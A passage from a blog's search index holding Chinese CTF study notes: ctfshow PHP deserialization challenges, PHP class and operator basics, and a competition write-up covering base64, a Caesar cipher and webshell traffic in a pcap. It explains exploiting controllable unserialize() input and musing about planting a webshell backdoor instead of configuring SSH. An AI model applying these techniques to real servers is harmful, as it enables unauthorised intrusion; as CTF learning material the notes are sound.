<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E9%A2%98/"/>
      <url>/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化真题"><a href="#PHP反序列化真题" class="headerlink" title="PHP反序列化真题"></a>PHP反序列化真题</h1><h2 id="添加cookie的方法："><a href="#添加cookie的方法：" class="headerlink" title="添加cookie的方法："></a>添加cookie的方法：</h2><ol><li>  用burp去添加cookie，抓包后添加指定名字的cookie，只需要在cookie的后面加上待添加cookie的名称=待添加的值，即可</li></ol><pre class="line-numbers language-html" data-language="html"><code class="language-html">Cookie: user=xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133836.png"></li><li>  用firefox的插件添加</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133940.png"></li></ol><h2 id="序列化一个类的语法"><a href="#序列化一个类的语法" class="headerlink" title="序列化一个类的语法"></a>序列化一个类的语法</h2><ol><li>  将一个类实例化 (实例化时在类的后面加不加括号都可以，不影响输出的结果)。</li><li>  将这个对象序列化</li><li>  将序列化后的字符串进行url编码</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="对类的控制"><a href="#对类的控制" class="headerlink" title="对类的控制"></a>对类的控制</h2><ol><li>  我们不能改类的方法，即不能改类中的代码</li><li>  但是我们可以控制类的属性，即更改类中变量的值</li></ol><h2 id="ctfshow原题"><a href="#ctfshow原题" class="headerlink" title="ctfshow原题"></a>ctfshow原题</h2><h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><ol><li>  对cookie进行反序列化，需要调用user中的login函数，而此函数在ctfShowUser类中出现，则需要对ctfShowUser进行反序列化</li><li>  使用php在线反序列化工具即可</li></ol><h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">==     数值相等  可以进行数据类型转换，如果类型转换后$a和$b相等，则为true===   全等   不进行数据类型转换，如果$a等于$b，并且数据类型也相同，才能为true!=     不等   可以进行数据类型转换，如果类型转换后$a和$b不相等，返回值为true!==    不全等  不进行数据类型转换，如果$a和$b不相等，或者类型不相同，返回值为true&lt;=>    太空船运算符  当$a小于，等于，大于$b时分别返回一个小于，等于，大于0的int值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  题目有多个限制</li><li>  第一，username和password变量的值不能为空</li><li>  第二，实例化后的user对象，login函数中限制，username和传入login函数的$u相等，password中传入login函数的 $p相等，并且是强相等</li><li>  第三，判断调用的checkVip()函数中isVip的值是否为true</li><li>  第四，判断vipOneKeyGetFlag()函数中username和password是否不相等，是!==的不相等，可以进行数据类型转化</li><li>  这道题因为我们可以控制实例化的类，因为要求username和password不相等，所以我们可以在实例化类的时候将类中的username和password的值进行更改</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805142240.png"></p><ol start="7"><li>  一定不要忘记变量username和password的值要用引号包裹</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805142340.png"></p><h3 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h3><ol><li><p>  __destruct()：折构函数/方法</p></li><li><p>  析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p></li><li><p>  在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。</p></li><li><p>析构函数不能带有任何参数</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><ol><li>  ctfShowUser中调用了info()类，但是还提供了另一个backDoor类</li><li>  在反序列化时，我们只能控制类的属性，即类中变量的值，不能控制类的方法，即不能更改类的代码</li><li>  可以直接将ctfShowUser类中对info类的控制改为对backDoor的控制</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805151736.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805152421.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805152509.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805152722.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化原理"><a href="#PHP反序列化原理" class="headerlink" title="PHP反序列化原理"></a>PHP反序列化原理</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>  序列化就是将对象转换成字符串。反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220804163144.png"></p><ol start="2"><li>  最根本的是数据类型和格式的一种相互转换</li><li>  serialize() 将一个对象转换成一个字符串</li><li>  unserialize() 将字符串还原成一个对象</li></ol><h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><ol><li>  unserialize() 函数的变量可控，文件中存在可以利用的类</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220804164302.png"></p><ol start="2"><li>  上面”name”也可以理解为是一个值</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220804164601.png"></p><ol start="3"><li>  上图 s表示string类型 6表示6位 “xiaodi”表示值为”xiaodi”</li><li>  serialize()和unserialize()都是要先进行格式的判断，如果假如给一个字符串进行unserialize()则没有返回结果，如果给一个对象进行serialize()则也没有对象，因为数据类型格式不对，无法识别。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/PHP%E7%9A%84%E7%B1%BB/"/>
      <url>/PHP%E7%9A%84%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP中的类"><a href="#PHP中的类" class="headerlink" title="PHP中的类"></a>PHP中的类</h1><h2 id="PHP中private、public、protected的区别详解"><a href="#PHP中private、public、protected的区别详解" class="headerlink" title="PHP中private、public、protected的区别详解"></a>PHP中private、public、protected的区别详解</h2><ol><li>  public表示全局，类内部和外部的子类都可以访问</li><li>  private表示私有的，只有本类内部可以使用</li><li>  protected表示受保护的，只有本类或子类或父类中可以访问</li><li>  所以限制最高，安全最好的是priva</li></ol><h2 id="public公有类型"><a href="#public公有类型" class="headerlink" title="public公有类型"></a>public公有类型</h2><ol><li>  在子类中可以通过 <strong>self::属性名</strong> 调用public方法或书信，<strong>parent::属性名</strong> 调用父类方法</li><li>  在实例中可以通过 $obj-&gt;属性名来调用public类型的方法或属性</li></ol><h2 id="protected受保护类型"><a href="#protected受保护类型" class="headerlink" title="protected受保护类型"></a>protected受保护类型</h2><ol><li>  在子类中可以通过 <strong>self::属性名</strong> 调用protected方法或属性，parent::属性名调用父类方法</li><li>  和public的区别在于：不能在类的外部调用，只能在本类，子类和父类中访问</li></ol><h2 id="private私有属性"><a href="#private私有属性" class="headerlink" title="private私有属性"></a>private私有属性</h2><ol><li>  该类的属性和方法只能在该类中使用</li><li>  该类的实例，子类中和子类的实例中都不能调用私有类型的属性和方法</li></ol><h1 id="PHP-new-实例化对象"><a href="#PHP-new-实例化对象" class="headerlink" title="PHP new:实例化对象"></a>PHP new:实例化对象</h1><ol><li>  使用类中的属性和方法不像使用变量和函数那样简单，首先要对类进行实例化</li></ol><h2 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h2><ol><li>  将类实例化成对象非常容易，只需要使用new关键字并在后面加上一个和类同名的方法（**实际上就是new 类名()**）即可</li><li>  如果在实例化对象时不需要为对象传递参数，在new关键字后面直接使用类名称即可，不需要加上括号</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 类名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span><span class="token punctuation">;</span>或变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 类名<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ol><li>  变量名：通过类所创建的一个对象的引用名称，可以通过这个名称来访问对象的成员</li><li>  new关键字，表明要创建一个新的对象</li><li>  类名：表示新对象的类型</li><li>  参数列表：指定类的构造方法用于初始化对象的值，如果类中没有定义构造函数，PHP会自动创建一个不带参数的默认构造函数</li></ol><h2 id="创建一个类并将其实例化"><a href="#创建一个类并将其实例化" class="headerlink" title="创建一个类并将其实例化"></a>创建一个类并将其实例化</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">students</span><span class="token punctuation">&#123;</span><span class="token operator">...</span><span class="token punctuation">&#125;</span><span class="token variable">$person1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">students</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$person2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">students</span><span class="token punctuation">;</span><span class="token variable">$person3</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">students</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  一个类可以实例化出多个对象，每个对象都是独立的。</li><li>  上面的代码中通过students类实例化出三个对象，person1,person2,person3,相当于在内存中开辟了三分空间用于存放每个对象</li><li>  使用同一个类声明的多个对象之间是没有联系的，只能说明他们都是同一个类型，每个对象内部都有类中声明的成员属性和成员方法</li><li>  好比类型都是人，但是每个人都有自己的姓名，年龄，等等属性是不同的</li></ol><h2 id="访问对象中的成员"><a href="#访问对象中的成员" class="headerlink" title="访问对象中的成员"></a>访问对象中的成员</h2><ol><li>  对象中包含成员属性和成员方法，访问对象中的成员和访问数组中的元素相似，只能通过对象的引用来访问对象中的成员</li><li>  使用 <strong>-&gt;</strong> 来完成对象成员的访问</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php">变量名 <span class="token operator">=</span> <span class="token keyword">new</span> 类（参数）<span class="token punctuation">;</span>  <span class="token comment">//实例化一个类</span>变量名 <span class="token operator">-></span> 成员属性 <span class="token operator">=</span> 值；  <span class="token comment">//为成员属性赋值</span>变量名 <span class="token operator">-></span> 成员属性<span class="token punctuation">;</span>  <span class="token comment">//直接获取成员属性的值</span>变量名 <span class="token operator">-></span> 成员方法<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 访问对象中的成员方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">web</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$title</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'成员方法 demo()'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$student</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">web</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//进行实例化</span><span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">;</span> <span class="token comment">// 给web类变量student中的变量name赋值为xxx</span><span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">;</span> <span class="token comment">// 给web类实例化后的变量student中的url赋值为xxx</span><span class="token keyword">echo</span> <span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$student</span> <span class="token operator">-></span> <span class="token property">url</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ol><li>  this关键字的作用是：在实例化对象的时候用来规定指向谁</li><li>  this就是指向当前对象实例的指针，它不指向任何其它的对象或类</li><li>  $this-&gt;表示在类的本身内部使用本类的属性或方法，      <strong>指向当前类的实例化对象后的指针</strong></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$user1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user1</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'张三'</span><span class="token punctuation">;</span><span class="token variable">$user1</span> <span class="token operator">-></span> <span class="token function">getname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 这里就会输出张三<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关于什么是对象"><a href="#关于什么是对象" class="headerlink" title="关于什么是对象"></a>关于什么是对象</h2><ol><li><p>  变量是对象，函数是对象，类也是对象</p></li><li><p>  变量的类型有很多，变量属于类类型（和类很类似）。广义地讲，对象包含了变量，即变量也可以称为一种对象，狭义地讲，将对象看作类的实例，对象是某个类的对象。</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xml</title>
      <link href="/xml/"/>
      <url>/xml/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> xml </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022选拔赛复盘</title>
      <link href="/2022%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2022%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h1><pre class="line-numbers language-none"><code class="language-none">来签个到吧！我把奖励放在这里了，手慢无。ZmxhZ3t3ZWxjb21ldG8xMDA4Nn0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>因为后面没有明显的==或者=，一开始没想到是base64，就把hex，之类的编码都试了试，试到base64借出flag</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731171328.png"></li></ol><h1 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h1><pre class="line-numbers language-none"><code class="language-none">相传有一位大帝叫Caesar，他发明了一种神秘的编码，你能解开这段密文吗？密文内容：mshn&#123;jhlzhy_pz_mbuufek&#125;。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>题目明显指出是凯撒加密，凯撒加密原理是偏移，1~26之间的字符偏移量</li><li>题目前面给的格式很像flag{},m和f之间的字节偏移量为7，即可得到flag<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731171636.png"></li></ol><h2 id="解编码和解古典密码学的网站"><a href="#解编码和解古典密码学的网站" class="headerlink" title="解编码和解古典密码学的网站"></a>解编码和解古典密码学的网站</h2><ol><li>cyberchef<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;cyberchef.org&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>CTF在线工具<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.hiencode.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol><li>黑客通过webshell往web服务器中写入了一串机密信息，你能找出机密信息吗</li><li>webshell后门，我有一个很奇怪的设想，如果不想配置ssh免密登录之类的，可以直接往服务器里丢一个后门，然后蚁剑去连就可以登录了，但是有被杀的风险</li><li>题目给了一个pcap文件，导入到wireshark中<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172317.png"></li><li>蓝帽杯让我知道，分析流量先分析http</li><li>根据题目描述，”webshell”,同时发现了很多上传的shell.php文件，那么就分析分析shell.php<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172458.png"></li><li>发现每一个shell.php中都上传一串base64,一个一个解密看看，右键可以复制可打印的字符<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172618.png"></li><li>发现有%编码，先解一层URL编码<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172827.png"></li><li>再解一层base64，发现是木马，我们走对路了，继续一个一个地找<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731174212.png"></li><li>最后找着找着flag就出来了<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731174348.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP中的=&gt;-&gt;和::的用法</title>
      <link href="/PHP%E7%AE%AD%E5%A4%B4/"/>
      <url>/PHP%E7%AE%AD%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP中-gt-和-gt-以及-符号的用法"><a href="#PHP中-gt-和-gt-以及-符号的用法" class="headerlink" title="PHP中=&gt;和-&gt;以及::符号的用法"></a>PHP中=&gt;和-&gt;以及::符号的用法</h1><h2 id="gt-的用法"><a href="#gt-的用法" class="headerlink" title="-&gt;的用法"></a>-&gt;的用法</h2><ol><li>插入式解引用操作符</li><li>用于类里，访问类里的函数或对象,就是在类里面定义了一个函数，使用-&gt;可以调用这个类里面的函数<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">do_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"doing foo."</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">;</span><span class="token variable">$bar</span> <span class="token operator">=</span> <span class="token function">do_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>-&gt;用来引用对象的成员（属性和方法），即可以调用类里面定义的函数和变量<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token number">123</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span> <span class="token operator">=></span> <span class="token number">456</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token number">456</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$obj</span> <span class="token operator">-></span> <span class="token property">a</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="gt-的用法-1"><a href="#gt-的用法-1" class="headerlink" title="=&gt;的用法"></a>=&gt;的用法</h2><ol><li><p>创建关联数组时，经常使用=&gt;来操作数组</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>in <span class="token operator">=></span> <span class="token string single-quoted-string">'reply'</span><span class="token punctuation">,</span>side <span class="token operator">=></span> <span class="token string single-quoted-string">'left'</span><span class="token punctuation">,</span>padx <span class="token operator">=></span> <span class="token number">2</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p> 如果需要使用数字大于等于的符号，应该使用&gt;=而不是=&gt;</p></li><li><p>php中数组默认键名为整数，也可以自己定义任意字符键名，最好有实际意义，例如</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$css</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'style'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span><span class="token string single-quoted-string">'color'</span><span class="token operator">=></span><span class="token string single-quoted-string">'green'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'style'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token variable">$css</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'green'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p> 综上，=&gt;的作用就是用来给数组中的值赋值</p></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$arr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'one'</span> <span class="token operator">=></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword type-declaration">array</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'one'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="的用法"><a href="#的用法" class="headerlink" title="::的用法"></a>::的用法</h2><ol><li>  双冒号操作符，即作用域限定操作符，可以访问静态，const，类中重写的属性和方法</li></ol><h3 id="用变量在类定义外部访问"><a href="#用变量在类定义外部访问" class="headerlink" title="用变量在类定义外部访问"></a>用变量在类定义外部访问</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token constant">CONST_VALUE</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fruit color'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$classname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fruit'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$classname</span><span class="token operator">::</span><span class="token constant">CONST_VALUE</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token class-name static-context">fruit</span><span class="token operator">::</span><span class="token constant">CONST_VALUE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在类定义外部使用"><a href="#在类定义外部使用" class="headerlink" title="在类定义外部使用"></a>在类定义外部使用</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> <span class="token constant">const_value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fruit color'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token keyword">extends</span> <span class="token class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'red'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token constant">CONST_VALUE</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$color</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name static-context">apple</span><span class="token operator">::</span><span class="token function">doubleColon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="调用parent方法"><a href="#调用parent方法" class="headerlink" title="调用parent方法"></a>调用parent方法</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">fruit</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">showcolor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"fruit::showcolor()\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">apple</span> <span class="token keyword">extends</span> <span class="token 